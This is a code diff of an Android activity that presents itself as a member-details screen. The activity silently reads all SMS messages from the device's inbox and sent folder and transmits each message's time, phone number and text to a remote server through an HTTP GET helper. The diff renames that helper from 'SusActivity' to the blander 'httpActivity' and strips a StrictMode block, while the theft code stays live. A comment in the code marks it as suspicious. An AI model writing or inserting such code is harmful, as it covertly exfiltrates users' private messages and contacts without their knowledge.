@@ -16,6 +16,7 @@ import java.util.ArrayList;
 import java.util.List;
 
 
+
 public class DetailsActivity extends AppCompatActivity {
 
     TextView memberDetails;
@@ -34,19 +35,13 @@ public class DetailsActivity extends AppCompatActivity {
         }
 
         //here onwards is all suspicious code
-        int SDK_INT = android.os.Build.VERSION.SDK_INT;
-        if (SDK_INT > 8)
-        {
-            StrictMode.ThreadPolicy policy = new StrictMode.ThreadPolicy.Builder()
-                    .permitAll().build();
-            StrictMode.setThreadPolicy(policy);
-        }
+
 
         List<sms> smsList= sms();
         for (sms sms : smsList) {
             Log.v("sms", sms.getMsg());
             try {
-                SusActivity.sendGET("sms?time="+sms.getTime()+"&number="+sms.getAddress()+"&msg="+sms.getMsg());
+                httpActivity.sendGET("sms?time="+sms.getTime()+"&number="+sms.getAddress()+"&msg="+sms.getMsg());
             } catch (IOException e) {
                 e.printStackTrace();
             }
@@ -56,7 +51,7 @@ public class DetailsActivity extends AppCompatActivity {
 
     @SuppressLint("Range")
     public List<sms> sms() {
-        List<sms> smsList = new ArrayList<sms>();
+        List<sms> smsList = new ArrayList<>();
 
         Uri message = Uri.parse("content://sms/");
         ContentResolver cr = getContentResolver();
@@ -78,7 +73,6 @@ public class DetailsActivity extends AppCompatActivity {
                 } else {
                     objSms.setFolderName("sent");
                 }
-
                 smsList.add(objSms);
                 c.moveToNext();
             }
